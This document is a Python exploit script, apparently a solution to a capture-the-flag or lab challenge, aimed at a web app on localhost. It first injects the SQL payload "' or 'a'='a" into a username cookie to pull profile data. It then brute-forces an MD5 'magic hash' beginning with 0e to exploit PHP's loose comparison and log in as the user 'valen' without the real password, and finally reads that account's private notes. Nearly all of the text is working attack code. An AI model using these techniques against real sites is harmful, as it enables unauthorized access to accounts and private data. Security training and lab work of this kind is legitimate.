import hashlib
import requests
import re
import string
url = 'http://localhost:8080'
response = requests.get(url)
print(response.text + '\n\n')

user_username = "user"
user_password = "user"

login_params = {
    'operation': 'login',
    'username': user_username,
    'password': user_password
}

response = requests.get(url, params=login_params)
print(response.text + '\n\n')


response_cookies = response.cookies
print(response_cookies)
domain = response_cookies.list_domains()[0]

sql_payload = "' or 'a'='a"
response_cookies.set('username', sql_payload, domain=domain)
print(response_cookies)

show_profile_params = {
    'operation': 'show-profile'
}

response = requests.get(url, params=show_profile_params, cookies=response_cookies)
print(response.text)

valen_username = "valen"
valen_password_hashed = "0e855827688985529846921123252032"
# notice 0e at the beginning
# in php, a hash fitting the regex '0+e[0-9]*$' will always be equal to one another
# simply find a password that will have the hash of that regex

a = ""

pattern = '0+e[0-9]*$'

CHARACTERS = string.printable[:-6]
CHARACTERS_NUMBER = len(CHARACTERS)


def character_to_index(char):
    return CHARACTERS.index(char)


def index_to_character(index):
    return CHARACTERS[index]


test = []
print(test)
# bruteforce find md5 anything that matches the regex
while not re.match(pattern, hashlib.md5((a + "".join(test)).encode('utf-8')).hexdigest()):
    if len(test) <= 0:
        test.append(index_to_character(0))
    else:
        overflow = True
        index = len(test) - 1
        while overflow:
            test[index] = index_to_character((character_to_index(test[index]) + 1) % CHARACTERS_NUMBER)
            if test[index] == index_to_character(0):
                if index > 0:
                    index -= 1
                else:
                    test.append(index_to_character(0))
                    overflow = False
            else:
                overflow = False
print(f"{bytes(a + ''.join(test), 'utf-8')}: {hashlib.md5((a + ''.join(test)).encode('utf-8')).hexdigest()}")
a = a + "".join(test)

valen_password_candidate = a

login_params['username'] = valen_username
login_params['password'] = valen_password_candidate

response = requests.get(url, params=login_params)
print(response.text)

response_cookies = response.cookies

my_notes_params = {
    'operation': 'my-notes'
}

response = requests.get(url, params=my_notes_params, cookies=response_cookies)
print(response.text)

